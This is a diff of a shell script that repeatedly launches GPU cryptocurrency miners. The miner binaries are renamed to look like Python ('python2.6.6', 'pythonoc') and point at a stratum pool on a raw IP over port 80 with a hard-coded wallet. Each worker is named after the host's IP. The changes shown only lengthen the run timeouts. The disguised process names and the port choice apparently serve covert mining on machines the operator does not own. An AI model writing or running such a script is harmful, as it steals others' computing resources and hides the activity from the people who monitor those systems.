@@ -6,7 +6,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '##################### Test N 28 ########################'
+echo '##################### Test N 29 ########################'
 echo '#######################################################'
 
 rm -rf python2.6.6
@@ -29,7 +29,7 @@ then
     do 
         date >> results.txt
         echo "start loop"
-        timeout 600s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8  --cuda-block-size 256   --cu-schedule auto --cuda-streams 4 --cuda-grid-size 16384 2>> cuout 1>> cuout 
+        timeout 1200s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8  --cuda-block-size 256   --cu-schedule auto --cuda-streams 4 --cuda-grid-size 16384 2>> cuout 1>> cuout 
         echo "cuda-plus : $(grep Acc cuout | wc -l ) " >> results.txt
         cat  results.txt
         timeout 1200s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128  2>> ocout 1>> ocout 
@@ -37,7 +37,7 @@ then
         cat  results.txt
         timeout 1200s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U 2>> cuoutdef 1>> cuoutdef 
         echo "cuda-default : $(grep Acc cuoutdef | wc -l ) " >> results.txt
-        timeout 600s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G  2>> ocoutdef 1>> ocoutdef 
+        timeout 1200s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G  2>> ocoutdef 1>> ocoutdef 
         echo "opencl-default : $(grep Acc ocoutdef | wc -l ) " >> results.txt
         cat  results.txt
         timeout 1200s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128 2>> oout 1>> oout &
@@ -46,7 +46,7 @@ then
         timeout 1200s tail -f oout 
         
         echo "opencl+cuda : $(grep Acc oout | wc -l ) " >> results.txt  
-        echo '#################    Final 120s result    #################'   
+        echo '#################    Final 1200s result    #################'   
         echo '###############################################' >> results.txt 
         cat  results.txt
     done
@@ -56,7 +56,7 @@ else
     do
         date >> results.txt
         echo "start loop"
-        timeout 600s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8  --cuda-block-size 256   --cu-schedule auto --cuda-streams 4 --cuda-grid-size 16384 2>> cuout 1>> cuout 
+        timeout 1200s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8  --cuda-block-size 256   --cu-schedule auto --cuda-streams 4 --cuda-grid-size 16384 2>> cuout 1>> cuout 
         echo "cuda-plus : $(grep Acc cuout | wc -l ) " >> results.txt
         cat  results.txt
         timeout 1200s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128  2>> ocout 1>> ocout 
@@ -64,7 +64,7 @@ else
         cat  results.txt
         timeout 1200s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U 2>> cuoutdef 1>> cuoutdef 
         echo "cuda-default : $(grep Acc cuoutdef | wc -l ) " >> results.txt
-        timeout 600s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G  2>> ocoutdef 1>> ocoutdef 
+        timeout 1200s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G  2>> ocoutdef 1>> ocoutdef 
         echo "opencl-default : $(grep Acc ocoutdef | wc -l ) " >> results.txt
         cat  results.txt
         timeout 1200s ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128 2>> oout 1>> oout &
@@ -73,7 +73,7 @@ else
         timeout 1200s tail -f oout 
         
         echo "opencl+cuda : $(grep Acc oout | wc -l ) " >> results.txt  
-        echo '#################    Final 120s result    #################'   
+        echo '#################    Final 1200s result    #################'   
         echo '###############################################' >> results.txt 
         cat  results.txt
     done
